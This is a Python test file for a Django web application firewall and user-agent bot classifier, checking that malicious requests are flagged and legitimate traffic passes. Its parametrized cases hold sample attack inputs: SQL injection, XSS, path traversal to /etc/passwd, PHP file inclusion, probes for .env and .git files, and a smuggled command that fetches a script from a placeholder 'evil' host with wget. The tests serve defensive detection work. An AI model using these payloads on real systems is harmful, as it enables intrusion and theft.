"""WAF rule groups + bot classification."""
import pytest
from django.test import RequestFactory

from apps.security.botdetect import (
    CATEGORY_ALLOWED,
    CATEGORY_BLOCKED,
    CATEGORY_EMPTY,
    CATEGORY_SUSPICIOUS,
    CATEGORY_UNKNOWN,
    classify,
)
from apps.security.waf import inspect

from .conftest import make_config

rf = RequestFactory()


class TestWAF:
    @pytest.mark.parametrize("path,query,rule", [
        ("/api/files/", "name=../../etc/passwd", "path_traversal"),
        ("/api/files/", "name=%2e%2e%2fetc", "path_traversal"),
        ("/api/x/", "q=1 UNION SELECT password FROM users", "sql_injection"),
        ("/api/x/", "q=1' OR 1=1--", "sql_injection"),
        ("/api/x/", "q=sleep(5)", "sql_injection"),
        ("/api/x/", "q=<script>alert(1)</script>", "xss"),
        ("/api/x/", "redirect=javascript:alert(1)", "xss"),
        ("/api/x/", "cmd=;wget http://evil/x.sh", "remote_code_execution"),
        ("/api/x/", "f=php://filter/read", "file_inclusion"),
        ("/wp-admin/setup.php", "", "scanner_probes"),
        ("/.env", "", "scanner_probes"),
        ("/.git/config", "", "scanner_probes"),
    ])
    def test_malicious_requests_are_flagged(self, path, query, rule):
        request = rf.generic("GET", f"{path}?{query}" if query else path)
        violations = inspect(request, make_config())
        assert rule in [v.rule for v in violations]

    @pytest.mark.parametrize("path,query", [
        ("/api/residents/", "search=o'brien&page=2"),
        ("/api/billing/dues/", "month=2026-07&ordering=-created_at"),
        ("/api/notices/", "q=union meeting for selection committee"),
        ("/api/rooms/", "floor=1&status=available"),
    ])
    def test_legitimate_api_traffic_is_clean(self, path, query):
        request = rf.get(f"{path}?{query}")
        assert inspect(request, make_config()) == []

    def test_disallowed_method_is_flagged(self):
        request = rf.generic("TRACE", "/api/x/")
        violations = inspect(request, make_config())
        assert "method_not_allowed" in [v.rule for v in violations]

    def test_oversized_query_is_flagged(self):
        request = rf.get("/api/x/", {"q": "a" * 5000})
        violations = inspect(request, make_config())
        assert "oversized_query" in [v.rule for v in violations]

    def test_rule_groups_are_switchable(self):
        config = make_config({"waf": {"rules": {"scanner_probes": False}}})
        request = rf.get("/.env")
        assert inspect(request, config) == []

    def test_waf_disabled_short_circuits(self):
        config = make_config({"waf": {"enabled": False}})
        request = rf.get("/api/x/?q=<script>alert(1)</script>")
        assert inspect(request, config) == []


class TestBotDetection:
    def test_attack_tool_is_blocked_category(self):
        verdict = classify("sqlmap/1.7-dev (http://sqlmap.org)", make_config())
        assert verdict.category == CATEGORY_BLOCKED
        assert verdict.action == "block"

    def test_generic_automation_is_suspicious_log_only(self):
        verdict = classify("curl/8.4.0", make_config())
        assert verdict.category == CATEGORY_SUSPICIOUS
        assert verdict.action == "log"

    def test_good_bot_allowed_even_if_it_matches_suspicious(self):
        ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        verdict = classify(ua, make_config())
        assert verdict.category == CATEGORY_ALLOWED
        assert verdict.action == "allow"

    def test_browser_is_unknown_allowed(self):
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126"
        verdict = classify(ua, make_config())
        assert verdict.category == CATEGORY_UNKNOWN
        assert verdict.action == "allow"

    def test_empty_user_agent_uses_configured_action(self):
        assert classify("", make_config()).category == CATEGORY_EMPTY
        config = make_config({"bots": {"empty_user_agent_action": "block"}})
        assert classify("", config).action == "block"

    def test_disabled_returns_allow(self):
        config = make_config({"bots": {"enabled": False}})
        assert classify("sqlmap", config).action == "allow"
